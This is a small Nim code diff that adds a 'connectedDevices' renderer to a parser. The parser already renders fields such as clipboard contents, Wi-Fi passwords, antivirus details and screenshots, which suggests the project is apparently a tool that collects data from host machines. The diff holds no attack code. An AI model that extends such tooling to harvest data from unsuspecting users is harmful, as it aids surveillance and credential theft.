@@ -17,6 +17,7 @@ import ../components/av
 import ../components/connectedWifi
 import ../components/wifiPassword
 import ../components/screenshot
+import ../components/connectedDevices
 
 proc parseThreads*(id: string, data: string): string =
   for thread in data.split("."):
@@ -53,6 +54,8 @@ proc parseThreads*(id: string, data: string): string =
         result.add keyboardLocale.render data
     of "c":
       result.add clipboard.render threadData.split(";")
+    of "cd":
+      result.add connectedDevices.render threadData.split(";")
     of "av":
       result.add av.render threadData.split(";")
     of "wp":
